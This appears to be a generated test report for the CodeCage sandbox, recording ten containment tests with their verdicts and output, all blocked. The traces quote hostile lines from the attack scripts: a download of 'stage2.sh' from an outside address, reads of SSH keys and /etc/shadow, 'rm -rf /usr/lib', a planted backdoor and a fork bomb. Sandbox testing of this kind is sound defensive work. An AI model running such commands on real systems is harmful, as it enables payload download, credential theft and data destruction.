# CodeCage security test results

Generated **2026-11-18 13:32:34** against `http://localhost:8080`  
Podman **6.2.0** · rootless **True** · fedora 44 · kernel `7.2.11-200.fc44.aarch64` · cgroups v2 ['cpu', 'io', 'memory', 'pids'] · seccomp True · SELinux True

**10/10 attacks contained.** All submitted concurrently (max 4 sandboxes at once, rest queued). Leftover sandbox containers afterwards: **0**. Host load average before/after: `0.49 0.42 0.24 1/238 25889` → `0.53 0.43 0.24 1/257 26350`.

| # | Attack | Lang | Expected | Actual verdict | Contained | Requirement | Evidence |
|---|---|---|---|---|---|---|---|
| 1 | Infinite loop | cpp | Time Limit Exceeded | **Time Limit Exceeded** | ✅ | SR-7, SR-5 | The program was still running after 3s, so the sandbox killed it. |
| 2 | Memory exhaustion | python | Memory Limit Exceeded | **Memory Limit Exceeded** | ✅ | SR-4 | The program exceeded the 256 MB memory limit. |
| 3 | Fork bomb | python | Security Violation / Time Limit Exceeded | **Security Violation** | ✅ | SR-6 | Fork bomb contained: the program hit the 64-process limit (59 process creations were refused). |
| 4 | Network access / download | python | Security Violation | **Security Violation** | ✅ | SR-3 | Network access blocked: the sandbox has no network interface besides loopback. |
| 5 | Read host files & secrets | python | Security Violation | **Security Violation** | ✅ | SR-9 | Host files are not reachable: the sandbox has no bind mounts and sees only its own image. |
| 6 | Delete / modify system files | python | Security Violation | **Security Violation** | ✅ | SR-8, SR-10 | Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set. |
| 7 | Fill the disk | python | Security Violation | **Security Violation** | ✅ | SR-8 | Disk-fill blocked: the scratch area is a small, size-limited tmpfs. |
| 8 | Endless output | cpp | Output Limit Exceeded | **Output Limit Exceeded** | ✅ | SR-11 | The program produced 1,097,188 bytes of output and was stopped at the output cap. |
| 9 | Gain root / escalate privileges | python | Security Violation | **Security Violation** | ✅ | SR-2, SR-10 | Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set. |
| 10 | Spy on other submissions | python | Security Violation | **Security Violation** | ✅ | SR-9, FR-2 | Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set. |

## Evidence per attack

### 1. Infinite loop  (`attacks/01_infinite_loop.cpp`)

Spins forever at 100% CPU. The wall-clock limit must kill it, and the CPU quota keeps the host responsive meanwhile.

- **Expected:** Time Limit Exceeded
- **Actual:** Time Limit Exceeded: The program was still running after 3s, so the sandbox killed it.
- **Container:** `7f29229b6baa` (removed) · exit `137` signal SIGKILL · run 3000 ms · total 3484 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
Spinning forever... try and stop me.
# stderr

```

### 2. Memory exhaustion  (`attacks/02_memory_bomb.py`)

Allocates 50 MB chunks and touches every page until the cgroup memory limit stops it.

- **Expected:** Memory Limit Exceeded
- **Actual:** Memory Limit Exceeded: The program exceeded the 256 MB memory limit.
- **Container:** `75b3376d6d1d` (removed) · exit `137` signal SIGKILL · run 77 ms · total 479 ms
- **cgroup counters:** oom_killed=True · refused forks=0 · sandbox uid=10001

```text
# stdout
holding 50 MB
holding 100 MB
holding 150 MB
holding 200 MB
holding 250 MB
# stderr

```

### 3. Fork bomb  (`attacks/03_fork_bomb.py`)

Classic exponential fork bomb. The PID cgroup limit caps the number of processes, so the host never notices.

- **Expected:** Security Violation / Time Limit Exceeded
- **Actual:** Security Violation: Fork bomb contained: the program hit the 64-process limit (59 process creations were refused).
- **Container:** `7e9f5e7b175f` (removed) · exit `1`  · run 168 ms · total 736 ms
- **cgroup counters:** oom_killed=False · refused forks=59 · sandbox uid=10001

```text
# stdout
Detonating fork bomb...
# stderr
ne 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
Traceback (most recent call last):
  File "/sandbox/main.py", line 10, in <module>
    os.fork()
BlockingIOError: [Errno 11] Resource temporarily unavailable
```

### 4. Network access / download  (`attacks/04_network_exfil.py`)

Tries a TCP connection, a UDP DNS query, IPv6, and an HTTP payload download. The sandbox runs with --network=none.

- **Expected:** Security Violation
- **Actual:** Security Violation: Network access blocked: the sandbox has no network interface besides loopback.
- **Container:** `4e3da8c862a4` (removed) · exit `1`  · run 207 ms · total 738 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
network interfaces visible: ['lo']
[ok] TCP connect 1.1.1.1:443: blocked (OSError: [Errno 101] Network unreachable)
[ok] UDP DNS query to 8.8.8.8:53: blocked (OSError: [Errno 101] Network unreachable)
[ok] IPv6 connect [2606:4700:4700::1111]:443: blocked (OSError: [Errno 101] Network unreachable)
# stderr
main.py", line 24, in <module>
    payload = urllib.request.urlopen("http://1.1.1.1/stage2.sh", timeout=3).read()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 215, in urlopen
    return opener.open(url, data, timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 515, in open
    response = self._open(req, data)
               ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 532, in _open
    result = self._call_chain(self.handle_open, protocol, protocol +
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 492, in _call_chain
    result = func(*args)
             ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 1386, in http_open
    return self.do_open(http.client.HTTPConnection, req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/urllib/request.py", line 1360, in do_open
    raise URLError(err)
urllib.error.URLError: <urlopen error [Errno 101] Network unreachable>
```

### 5. Read host files & secrets  (`attacks/05_host_files.py`)

Hunts for the host's home directories, password files, the Podman socket and platform secrets.

- **Expected:** Security Violation
- **Actual:** Security Violation: Host files are not reachable: the sandbox has no bind mounts and sees only its own image.
- **Container:** `70f2cd66f7ff` (removed) · exit `1`  · run 11 ms · total 478 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
[ok] /Users: FileNotFoundError: No such file or directory
[ok] /home: FileNotFoundError: No such file or directory
[ok] /root: FileNotFoundError: No such file or directory
[ok] /run/podman/podman.sock: FileNotFoundError: No such file or directory
[ok] /var/run/docker.sock: FileNotFoundError: No such file or directory
[ok] /run/secrets: listing = [] (empty)
[ok] /proc/1/environ: PermissionError: Permission denied
[ok] /etc/shadow: PermissionError: Permission denied

/etc/passwd inside the sandbox (the image's own file, not the host's):
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
sandbox:x:10001:10001::/home/sandbox:/sbin/nologin
# stderr
Traceback (most recent call last):
  File "/sandbox/main.py", line 25, in <module>
    print(open("/home/user/.ssh/id_rsa").read())
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/user/.ssh/id_rsa'
```

### 6. Delete / modify system files  (`attacks/06_destroy_system.py`)

Tries to delete binaries, overwrite /etc/passwd and plant a file in /usr/bin.

- **Expected:** Security Violation
- **Actual:** Security Violation: Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set.
- **Container:** `da0fda26cec3` (removed) · exit `1`  · run 72 ms · total 281 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
[ok] rm -rf /usr/lib: OSError: [Errno 30] Read-only file system: '/usr/lib'
[ok] chmod 777 /etc: OSError: [Errno 30] Read-only file system: '/etc'
[ok] plant /usr/bin/backdoor: OSError: [Errno 30] Read-only file system: '/usr/bin/backdoor'
# stderr
Traceback (most recent call last):
  File "/sandbox/main.py", line 21, in <module>
    with open("/etc/passwd", "a") as f:
         ^^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: '/etc/passwd'
```

### 7. Fill the disk  (`attacks/07_disk_fill.py`)

Writes a giant file in 1 MB chunks. The scratch tmpfs size and RLIMIT_FSIZE stop it long before the host disk is touched.

- **Expected:** Security Violation
- **Actual:** Security Violation: Disk-fill blocked: the scratch area is a small, size-limited tmpfs.
- **Container:** `766fd29cfea8` (removed) · exit `1`  · run 14 ms · total 240 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
wrote 4 MB
wrote 8 MB
wrote 12 MB
wrote 16 MB
# stderr
Traceback (most recent call last):
  File "/sandbox/main.py", line 12, in <module>
    f.write(chunk)
OSError: [Errno 27] File too large
```

### 8. Endless output  (`attacks/08_output_flood.cpp`)

Prints forever as fast as possible. Output is capped, the process is killed, and the platform stays healthy.

- **Expected:** Output Limit Exceeded
- **Actual:** Output Limit Exceeded: The program produced 1,097,188 bytes of output and was stopped at the output cap.
- **Container:** `1fadcd10535b` (removed) · exit `137` signal SIGKILL · run 10 ms · total 442 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
line 0: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 2: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 3: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 4: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 5: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 6: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 7: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 8: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 9: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 10: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 11: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 12: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 13: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 14: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 15: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 16: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 17: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 18: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 19: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 20: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
line 21: AAAAAAAAAA
# stderr

```

### 9. Gain root / escalate privileges  (`attacks/09_privilege_escalation.py`)

Checks its identity and capabilities, looks for setuid binaries, then tries setuid(0), chroot and mount.

- **Expected:** Security Violation
- **Actual:** Security Violation: Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set.
- **Container:** `6cc8c5abce47` (removed) · exit `1`  · run 17 ms · total 245 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
uid=10001 euid=10001 gid=10001
  CapPrm:	0000000000000000
  CapEff:	0000000000000000
  CapBnd:	0000000000000000
  NoNewPrivs:	1
  Seccomp:	2
  Seccomp_filters:	1
setuid/setgid binaries: none
sudo/su present: False
mount tmpfs -> -1 (errno 1: Operation not permitted)
chroot -> [Errno 1] Operation not permitted: '/'
# stderr
Traceback (most recent call last):
  File "/sandbox/main.py", line 28, in <module>
    os.setuid(0)
PermissionError: [Errno 1] Operation not permitted
```

### 10. Spy on other submissions  (`attacks/10_cross_submission.py`)

Looks for other sandboxes' processes, files and IPC, and tries to kill everything it can see.

- **Expected:** Security Violation
- **Actual:** Security Violation: Privileged action blocked: the program runs as an unprivileged user with every capability dropped and no-new-privileges set.
- **Container:** `469b5df9481c` (removed) · exit `1`  · run 78 ms · total 488 ms
- **cgroup counters:** oom_killed=False · refused forks=0 · sandbox uid=10001

```text
# stdout
processes visible in my PID namespace: [1, 8]
  pid 1: /usr/local/bin/cage-runner
  pid 8: python3 -I -B -u main.py
files in /sandbox: ['__pycache__', 'main.py']
files in /tmp: []
hostname: 469b5df9481c
SysV shared memory: none
still alive after the kill sweep; nothing outside this sandbox was reachable
# stderr
Traceback (most recent call last):
  File "/sandbox/main.py", line 34, in <module>
    open("/proc/1/root/sandbox/main.py").read()
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: '/proc/1/root/sandbox/main.py'
```
